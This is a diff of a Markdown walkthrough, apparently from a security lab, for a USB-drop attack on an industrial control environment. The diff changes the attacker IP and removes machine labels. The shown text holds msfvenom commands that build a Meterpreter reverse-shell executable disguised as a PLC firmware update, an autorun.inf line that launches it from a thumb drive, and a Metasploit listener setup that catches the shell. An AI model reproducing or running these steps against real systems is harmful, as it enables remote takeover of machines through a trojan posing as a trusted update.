@@ -17,10 +17,10 @@ The malicious program can be generated using **Metasploit**’s `msfvenom` tool.
 #### Command to Generate a Payload:
 
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.51.10 LPORT=4444 -f exe -o firmware_update.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.115 LPORT=4444 -f exe -o firmware_update.exe
 ```
 
-- LHOST: IP address of the attacker's machine (M1) where the reverse shell will connect.
+- LHOST: IP address of the attacker's machine where the reverse shell will connect.
 - LPORT: Port to listen for the reverse shell connection.
 - -f exe: Specifies the format of the output file as a Windows executable.
 - firmware_update.exe: The name of the malicious file disguised as a firmware update.
@@ -29,7 +29,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.51.10 LPORT=4444 -f ex
 ### 2. Load the Payload onto a USB Thumb Drive
 Once the malicious executable is created, it needs to be placed on a USB thumb drive:
 
-- Insert the USB drive into the attacker's machine (M1).
+- Insert the USB drive into the attacker's machine
 
 - Copy the malicious payload onto the drive:
 ```
@@ -51,14 +51,14 @@ echo "open=PLC_Firmware_Update.exe" >> /media/usb-drive/autorun.inf
 - Save and safely eject the USB drive.
 
 ### 4. Test the Malicious Payload
-Test the payload to ensure it works as expected by running the PLC_Firmware_Update.exe on a virtual machine or test system. You can listen for the reverse shell on the attacker's machine (M1) using Metasploit:
+Test the payload to ensure it works as expected by running the PLC_Firmware_Update.exe on a virtual machine or test system. You can listen for the reverse shell on the attacker's machine using Metasploit:
 
 #### Set up a Metasploit Listener:
 ```
 msfconsole
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
-set LHOST 192.168.51.10
+set LHOST 192.168.0.115
 set LPORT 4444
 exploit
 ```
